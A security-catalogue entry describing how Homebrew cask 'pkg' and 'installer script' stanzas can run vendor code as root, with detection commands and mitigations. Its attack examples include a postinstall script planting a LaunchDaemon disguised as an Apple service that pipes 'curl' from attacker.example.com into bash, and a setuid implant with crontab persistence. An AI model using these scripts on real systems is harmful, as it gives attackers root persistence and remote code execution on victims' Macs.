---
name: "Cask pkg and installer script Privilege Escalation"
packageManager: "brew"
slug: "brew-cask-installer-pkg"
category: "Code Execution"
severity: "high"
platform:
  - "macOS"
description: "The Cask DSL provides a `pkg` stanza for a macOS package and an `installer script:` stanza for an executable. These vendor-supplied installer artifacts run outside Homebrew's sandbox; some request elevation, and macOS package scripts can run as root after authorization. A non-official cask must also be explicitly trusted by installing its fully qualified name or using `brew trust`. The `allow_untrusted: true` option on `pkg` relaxes installer certificate trust checks for that package; it is not a generic Gatekeeper bypass for arbitrary payloads."
descriptionCitations: [1, 2, 3, 4, 5]
prerequisites:
  - "Victim has admin rights on the Mac and uses `brew install --cask`"
  - "Attacker controls a cask that the victim explicitly trusts, or compromises an already trusted cask or official distribution path"
  - "Victim authorizes the macOS authentication prompt during install"
prerequisitesCitations: [1, 2, 3, 4, 5]
attackScenarios:
  - title: "pkg Stanza Installing an Attacker-Signed Package as Root"
    description: "The cask points `pkg` at a `.pkg` the attacker ships. macOS's installer can run the package's preinstall and postinstall scripts as root once the user authorizes installation, subject to macOS platform protections. `allow_untrusted: true` tells the installer to accept a package with an untrusted signing certificate, increasing risk when users install casks from third-party taps."
    citations: [1, 2, 3, 4, 5]
    commands:
      - label: "Malicious Cask using the pkg stanza"
        code: |
          cask "mac-optimizer" do
            version "1.2.3"
            sha256 "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

            url "https://example.com/mac-optimizer-#{version}.pkg"
            name "Mac Optimizer"
            homepage "https://example.com/mac-optimizer"

            pkg "MacOptimizer-#{version}.pkg",
                allow_untrusted: true

            uninstall pkgutil: "com.example.macoptimizer"
          end
        language: "ruby"
      - label: "Attacker-built .pkg with a postinstall script running as root"
        code: |
          # scripts/postinstall inside the .pkg payload - runs as root at install time
          #!/bin/bash
          set -e
          # Drop a LaunchDaemon (root persistence)
          cat > /Library/LaunchDaemons/com.apple.softwareupdate.helper.plist <<'PLIST'
          <?xml version="1.0" encoding="UTF-8"?>
          <plist version="1.0"><dict>
            <key>Label</key><string>com.apple.softwareupdate.helper</string>
            <key>ProgramArguments</key>
            <array><string>/bin/bash</string><string>-c</string>
            <string>curl -fsSL https://attacker.example.com/b | bash</string></array>
            <key>RunAtLoad</key><true/>
            <key>KeepAlive</key><true/>
          </dict></plist>
          PLIST
          chown root:wheel /Library/LaunchDaemons/com.apple.softwareupdate.helper.plist
          launchctl load -w /Library/LaunchDaemons/com.apple.softwareupdate.helper.plist
        language: "bash"
      - label: "Victim install triggers a single admin prompt"
        code: |
          brew install --cask mac-optimizer
          # macOS prompts for admin credentials (looks like any .pkg install)
          # The .pkg's postinstall runs as root and drops the LaunchDaemon
        language: "bash"
  - title: "installer script: sudo: true Running Arbitrary Binary as Root"
    description: "`installer script:` points at an arbitrary executable inside the cask payload and `sudo: true` promotes it to root. Unlike `pkg`, this path does not require building a signed .pkg - any shell script or Mach-O works. Attackers use this when targeting users who have disabled Gatekeeper or when distributing through internal taps."
    citations: [1, 2, 3, 4, 5]
    commands:
      - label: "Cask using installer script with sudo"
        code: |
          cask "corp-cli" do
            version "4.5.6"
            sha256 "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
            url "https://internal.example.com/corp-cli-#{version}.tar.gz"

            installer script: {
              executable: "#{staged_path}/setup.sh",
              args:       ["--install", "--system"],
              sudo:       true
            }
          end
        language: "ruby"
      - label: "setup.sh inside the tarball"
        code: |
          #!/bin/bash
          # Runs as root because of sudo: true
          install -m 4755 /tmp/implant /usr/local/bin/corp-helper
          echo "@reboot root /usr/local/bin/corp-helper >/dev/null 2>&1" >> /etc/crontab
        language: "bash"
  - title: "Malicious Update of an Installed Cask"
    description: "If the cask remains installed, a later `brew upgrade --cask` can execute a changed `pkg` or `installer script:` artifact. An uninstalled cask is not silently reinstalled by `brew upgrade --cask`; reinstalling it requires a new install action."
    citations: [1, 2, 3, 4, 5]
    commands:
      - label: "Upgrade flow for an installed cask"
        code: |
          # Day 1
          brew install --cask mac-optimizer     # root persistence installed
          # Day 7: the still-installed cask has an available malicious update
          brew upgrade --cask mac-optimizer     # updated installer runs after approval
        language: "bash"
detection:
  - title: "Flag casks that use pkg, installer script, or sudo"
    description: "Search cask source for stanzas that can run code as root. Most legitimate app-bundle casks use only an `app` stanza and have no need for `pkg`, `installer`, or `sudo: true`."
    citations: [1, 2, 3, 4, 5]
    commands:
      - code: |
          brew cat --cask mac-optimizer | \
            grep -nE "^\s*(pkg|installer)\b|sudo:\s*true|allow_untrusted"
        language: "bash"
  - title: "Audit newly-written LaunchDaemons after cask installs"
    description: "LaunchDaemons live in `/Library/LaunchDaemons` and run as root on boot. Any new plist there created during or shortly after `brew install --cask` is highly suspicious."
    citations: [1, 2, 3, 4, 5]
    commands:
      - code: |
          sudo find /Library/LaunchDaemons -type f -newermt "1 hour ago" -ls
          # Compare running daemons to the set your fleet expects
          launchctl list | awk '{print $3}' | sort -u
        language: "bash"
  - title: "Capture installer(8) invocations from brew"
    description: "macOS's unified log records every `installer` invocation. Filter for the parent brew process to spot when a cask runs a .pkg and with what script identifiers."
    citations: [1, 2, 3, 4, 5]
    commands:
      - code: |
          log show --last 1h --predicate 'process == "installer"' --info | \
            grep -E "PackageKit|Scripts|install-"
        language: "bash"
mitigation:
  - "Run `brew cat --cask <name>` before install; reject or closely review any cask whose stanzas include `pkg` or `installer script:`, and treat `sudo: true` or `allow_untrusted` as elevated-risk signals"
  - "For non-official casks, trust only the named cask rather than the entire tap"
  - "Do not perform `brew install --cask` from an admin account; use a separate standard user and elevate deliberately"
  - "Require code-signed and notarized .pkg payloads - refuse `allow_untrusted: true` via policy"
  - "Monitor `/Library/LaunchDaemons` and `/Library/LaunchAgents` for plists created during brew operations"
  - "Review every cask upgrade's diff before allowing it to land (`HOMEBREW_NO_AUTO_UPDATE=1` then manual `brew update`)"
  - "For managed fleets, disable `brew install --cask` entirely and distribute apps via MDM"
mitigationCitations: [1, 2, 3, 4, 5]
references:
  - title: "Homebrew Cask Cookbook - pkg stanza"
    url: "https://docs.brew.sh/Cask-Cookbook#stanza-pkg"
  - title: "Homebrew Cask Cookbook - installer stanza"
    url: "https://docs.brew.sh/Cask-Cookbook#stanza-installer"
  - title: "Apple installer(8) manual"
    url: "https://ss64.com/mac/installer.html"
  - title: "Homebrew Security and Supply Chain"
    url: "https://docs.brew.sh/Homebrew-Security-and-Supply-Chain"
  - title: "Homebrew Tap Trust"
    url: "https://docs.brew.sh/Tap-Trust"
historicalNotes:
  - date: "30 April, 2026"
    note: >-
      Corrected the distinction between pkg and installer script behavior,
      clarified that sudo: true applies to installer script rather than pkg,
      and revised the allow_untrusted explanation to reflect installer
      certificate trust semantics rather than a broad Gatekeeper bypass.
      Sources:
      <a href="https://docs.brew.sh/Cask-Cookbook#stanza-pkg" target="_blank" rel="noopener">Homebrew Cask Cookbook - pkg stanza</a>;
      <a href="https://docs.brew.sh/Cask-Cookbook#stanza-installer" target="_blank" rel="noopener">Homebrew Cask Cookbook - installer stanza</a>.
created: 2026-04-21
updated: 2026-10-14
---
